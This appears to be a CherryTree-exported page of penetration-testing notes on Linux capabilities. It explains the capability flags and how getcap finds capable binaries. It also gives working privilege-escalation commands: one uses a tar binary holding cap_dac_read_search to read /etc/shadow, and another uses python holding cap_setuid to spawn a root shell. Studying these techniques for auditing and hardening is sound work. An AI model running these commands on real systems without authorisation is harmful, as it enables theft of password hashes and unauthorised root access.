<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Capabilities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Capabilities</h1></strong><br />• Capabilities are permissions set on a binary that allow it make specific system calls to the kernel.<br />   ◇ e.g. <code>CAP_NET_BIND_SERVICE</code> and <code>CAP_NET_RAW</code> set on the apache binary allow Apache to create raw network sockets with root permissions<br />   ◇ Apache would need this because it needs to open privileged ports (80 and 443), which normally only root can do.<br />• Capabilities are a modern implementation in Unix and were designed to be more secure than having SUID binaries.<br /><br /><strong>Links</strong><br />• <a href="https://linux.die.net/man/7/capabilities">https://linux.die.net/man/7/capabilities</a> - check what functions a capability provides<br /><br /><strong><h2>## About Permissions</h2></strong><br /><code>e</code> = effecitve<br /><code>p</code> = permitted<br /><br /><code>=ep</code> - means the binary has all the capabilities<br /><code>+ep</code> -means the specified capability has been added<br /><code>-ep</code> - means the specified cability has been removed<br /><br /><strong><h2>## Check capabilites</h2></strong><br /><code>getcap -r / 2&gt;/dev/null</code> - check for binaries with capabilities<br /><code>getcap /sbin/ping</code> - check the capabilities of a binary<br /><br /><strong><h2>## Interesting Capabilities</h2></strong><br /><strong><h3>### cap_dac_read_search+ep</h3></strong><br />This means the binary has the capability to read anything.<br /><br /><strong>#### tar</strong><br /><div class="codebox"><div class="codebox">nxnjz@test-machine:~$&nbsp;getcap&nbsp;-r&nbsp;/&nbsp;2&gt;/dev/null<br />/home/nxnjz/tar&nbsp;=&nbsp;cap_dac_read_search+ep</div></div><br />Tar can read any file because of this capability - SSH keys, /etc/shadow etc.<br /><br />Compress /etc/shadow - <code>./tar -cvf shadow.tar /etc/shadow</code><br />Extract it - <code>./tar -xvf shadow.tar</code><br />Read it - <code>cat shadow</code><br /><br /><strong><h3>### cap_setuid+ep</h3></strong><br />The binary has setuid capabilites<br /><br /><strong>#### python</strong><br />Give python a SUID bit - <code>sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7</code><br />Use python to spawn a root shell - <code>python2.7 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</code><br /></div>
</body>
</html>
